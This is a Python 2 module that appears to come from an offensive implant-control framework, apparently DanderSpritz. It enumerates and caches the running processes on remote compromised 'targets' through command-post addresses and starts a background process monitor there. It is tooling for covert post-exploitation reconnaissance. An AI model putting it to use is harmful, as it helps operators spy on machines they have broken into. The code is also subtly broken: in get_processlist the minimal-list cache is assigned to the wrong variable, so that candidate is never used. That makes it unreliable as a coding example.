
import dsz
import dsz.cmd
import dsz.script
import ops
import ops.cmd
import ops.db
import ops.project
import os.path
from datetime import timedelta, datetime
PROCESSLIST_TAG = 'OPS_BASE_PROCESS_LIST_TAG'
MINIMALLIST_TAG = 'OPS_MINIMAL_PROCESS_LIST_TAG'
PROCESSMONITOR_TAG = 'OPS_PROCESS_MONITOR_TAG'
MAX_LIST_CACHE_SIZE = 3
MAX_MONITOR_CACHE_SIZE = 3

def get_processlist(minimal=True, maxage=timedelta(seconds=0), targetID=None):
    if (targetID is None):
        targetID = ops.project.getTargetID()
    tdb = ops.db.get_tdb(targetID)
    mon_ids = find_process_monitor_commands(False, targetID)
    if (len(mon_ids) > 0):
        mon_cache = tdb.load_ops_object_bytag(tag=PROCESSMONITOR_TAG)
        if (len(mon_cache) > 0):
            mon_cache = mon_cache[(-1)]
            if (len(mon_cache.processlist) > 0):
                return mon_cache.processlist
    listcache = tdb.load_ops_object_bytag(tag=PROCESSLIST_TAG)
    listcand = None
    moncache = tdb.load_ops_object_bytag(tag=PROCESSMONITOR_TAG)
    moncand = None
    mincache = tdb.load_ops_object_bytag(tag=MINIMALLIST_TAG)
    mincand = None
    if (len(listcache) > 0):
        lastcache = listcache[(-1)]
        if ((datetime.now() - lastcache.cache_timestamp) < maxage):
            listcand = lastcache
    if (minimal and (len(moncache) > 0)):
        lastcache = moncache[(-1)]
        if ((datetime.now() - lastcache.cache_timestamp) < maxage):
            moncand = lastcache
    if (minimal and (len(mincache) > 0)):
        lastcache = mincache[(-1)]
        if ((datetime.now() - lastcache.cache_timestamp) < maxage):
            moncand = lastcache
    cands = filter((lambda x: (x is not None)), [listcand, moncand, mincand])
    retval = None
    if (len(cands) > 0):
        retval = cands[0]
        for othercand in cands[1:]:
            if ((len(othercand.processlist) > 0) and (othercand.cache_timestamp > retval.cache_timestamp)):
                retval = othercand
    if ((retval is not None) and (len(retval.processlist) > 0)):
        return retval.processlist
    proc_cmd = ops.cmd.getDszCommand('processes', list=True, minimal=minimal)
    if (ops.project.getTargetID() != targetID):
        proc_cmd.dszdst = ops.project.selectBestCPAddress(targetID, ('run %s' % proc_cmd))
    proc_list = proc_cmd.execute()
    if (proc_list is None):
        raise Exception('Command failed to execute')
    if (proc_list.commandmetadata.status != 0):
        raise Exception('Command did not execute successfully')
    retval = proc_list.processlist
    if minimal:
        tdb.save_ops_object(proc_list, tag=MINIMALLIST_TAG)
    else:
        tdb.save_ops_object(proc_list, tag=PROCESSLIST_TAG)
    tdb.truncate_cache_size_bytag(tag=PROCESSLIST_TAG, maxsize=MAX_LIST_CACHE_SIZE)
    tdb.truncate_cache_size_bytag(tag=MINIMALLIST_TAG, maxsize=MAX_LIST_CACHE_SIZE)
    tdb.truncate_cache_size_bytag(tag=PROCESSMONITOR_TAG, maxsize=MAX_MONITOR_CACHE_SIZE)
    return retval

def start_monitor(ignorelist=[], targetID=None):
    tdb = ops.db.get_tdb(targetID)
    mon_cmd = ops.cmd.getDszCommand('processes', monitor=True, ignore=ignorelist)
    wrap_cmd = ops.cmd.getDszCommand('python', dszbackground=True, arglist=['monitorwrap.py'])
    if ((len(ignorelist) == 0) and (len(find_process_monitor_commands(False, targetID)) == 0)):
        wrap_cmd.optdict['args'] = ('"-g -t %s -i 5 -s \\"%s \\" "' % (PROCESSMONITOR_TAG, str(mon_cmd)))
    elif (len(ignorelist) > 0):
        wrap_cmd.optdict['args'] = ('"-g -i 5 -s \\"%s \\" "' % str(mon_cmd))
    else:
        return
    print wrap_cmd
    wrap_cmd.execute()
    tdb.truncate_cache_size_bytag(tag=PROCESSMONITOR_TAG, maxsize=MAX_MONITOR_CACHE_SIZE)

def find_process_monitor_commands(allow_ignore=True, targetID=None):
    if (targetID is None):
        targetID = ops.project.getTargetID()
    target_addrs = ops.project.getCPAddresses(targetID)
    goodwords = ['processes', '-monitor']
    badwords = ['monitorwrap.py', '-target']
    if (not allow_ignore):
        badwords.append('-ignore')
    return ops.cmd.get_filtered_command_list(cpaddrs=target_addrs, isrunning=True, goodwords=goodwords, badwords=badwords)

def build_process_tree_recurse(proclist, ppid):
    retval = list()
    rootprocs = filter((lambda x: (x.parentid == ppid)), proclist)
    for rootproc in rootprocs:
        retval.append((rootproc, build_process_tree_recurse(proclist, rootproc.id)))
    return retval

def build_process_tree(proclist):
    retval = list()
    for proc in filter((lambda x: (x.id == 0)), proclist):
        retval.append((proc, []))
    rootprocs = filter((lambda x: (((x.parentid == 0) and (x.id != 0)) or (len(filter((lambda y: (y.id == x.parentid)), proclist)) == 0))), proclist)
    for rootproc in rootprocs:
        retval.append((rootproc, build_process_tree_recurse(proclist, rootproc.id)))
    return retval